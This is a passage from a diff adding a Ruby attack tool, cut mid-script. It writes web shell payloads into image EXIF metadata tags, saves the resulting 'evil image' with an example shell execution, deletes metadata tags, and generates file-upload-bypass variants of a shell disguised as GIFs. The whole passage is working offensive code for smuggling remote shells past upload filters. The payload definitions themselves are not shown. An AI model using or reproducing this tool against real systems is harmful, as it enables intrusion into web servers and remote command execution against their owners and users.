+  innocent = tmp + '/' + options[:img].split('/')[-1]
+  FileUtils.copy_file(options[:img], innocent, preserve = true)
+  Dir.chdir(tmp) do
+    photo = MiniExiftool.new(options[:img].split('/')[-1])
+    v = photo.exiftool_version.to_s.split('.')
+    height = photo.image_height
+    width = photo.image_width
+    puts
+    puts "ExifTool v#{v[0]}".light_red + ".".white + "#{v[1]}".light_red
+    puts
+    if not real.tags.include?(options[:tag])
+      puts "Provided Tag doesn't appear to exist".light_red + "!".white
+      if real.tags.include?('Comment')
+        puts "Trying generic approach to try and write to 'Comment' Tag".light_yellow + ".....".white
+        options[:tag] = 'Comment'
+      else
+        puts "Trying generic approach to create and write to Comment Tag".light_yellow + ".....".white
+        options[:tag] = 'Comment'
+      end
+    end
+    original = photo[options[:tag]]
+    puts "Attempting to write ".light_blue + "'".white + "#{shell} Shell".light_blue + "'".white + " to the ".light_blue + "'".white + "#{options[:tag]}".light_blue + "'".white + " tag".light_blue + "....".white
+    puts "Current Value".light_blue + ": #{original}".white
+    puts "Write String".light_blue + ": \n#{payload}".white
+    puts
+    if write(photo, payload, options[:tag])
+      photo.reload # reload the new file info
+      if original != photo[options[:tag]]
+        FileUtils.copy_file(options[:img].split('/')[-1], "#{EVIL}/#{options[:img].split('/')[-1]}", preserve = true)
+        puts
+        puts "Appears things were successful".light_green + "!".white
+        puts "Updated Value".light_green + ": #{photo[options[:tag]]}".white
+        puts "Find your evil image here".light_green + ": #{EVIL}#{options[:img].split('/')[-1]}".white
+        puts "Example #{shell} Shell Execution".light_green + ": #{c}".white
+      else
+        puts "WTF".light_red + "?".white + " Doesn't appear we changed the value".light_red + ".....".white
+        puts "Value".light_yellow + ": #{photo[options[:tag]]}".white
+        puts "Make sure Tag name was spelled properly, is writable and try again".light_red + "...".white
+      end
+    else
+      puts "Problem writing to '#{options[:tag]}' Tag".light_red + "!".white
+      puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+    end
+  end
+  FileUtils.rm_rf(tmp)
+when 4
+  # Delete MetaTag if possible
+  photo = MiniExiftool.new(options[:img])
+  if not photo.tags.include?(options[:tag])
+    puts "Can't delete what doesn't exist".light_red + "!".white
+    puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+  else
+    if delete(photo, options[:tag])
+      puts
+      puts "Appears MetaTag removal was successful".light_green + "!".white
+      puts "Run the dump option to confirm the changes".light_green + "....".white
+    else
+      puts "Problem wiping Tag".light_red + "!".white
+      puts "Make sure Tag name exists, is spelled properly, is writable and then try again".light_red + "...".white
+    end
+  end
+when 5
+  # Uploads Generator
+  puts 
+  puts "Generating file upload bypass possibilities for #{options[:shell].split('/')[-1]}".light_blue + ".....".white
+  generate_uploads(options[:shell], flip='gif')
+  puts "Uploader bypass files created".light_green + "!".white
+  puts "Find them all here".light_green + ": #{UP}".white
+  puts "May the force be with you".light_green + "...........".white
+end
+puts
+puts
+# EOF
